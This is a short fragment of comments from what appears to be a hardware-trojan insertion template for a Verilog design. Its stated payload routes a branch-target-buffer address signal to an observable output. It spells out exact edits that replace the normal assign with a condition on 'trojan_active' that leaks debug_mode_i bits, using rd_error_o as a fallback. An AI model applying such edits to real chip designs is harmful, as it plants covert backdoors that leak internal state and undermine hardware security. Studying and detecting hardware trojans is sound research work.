 ...
 * Payload: Route btb_ram_addr_prediction[0] to observable output
 * 
...
//   Find the assign for btb_ram_addr_prediction (or rd_error_o as fallback):
//     assign btb_ram_addr_prediction = <normal_expr>;
//   Replace with:
//     assign btb_ram_addr_prediction = trojan_active ? debug_mode_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? debug_mode_i[0] : 1'b0;
//
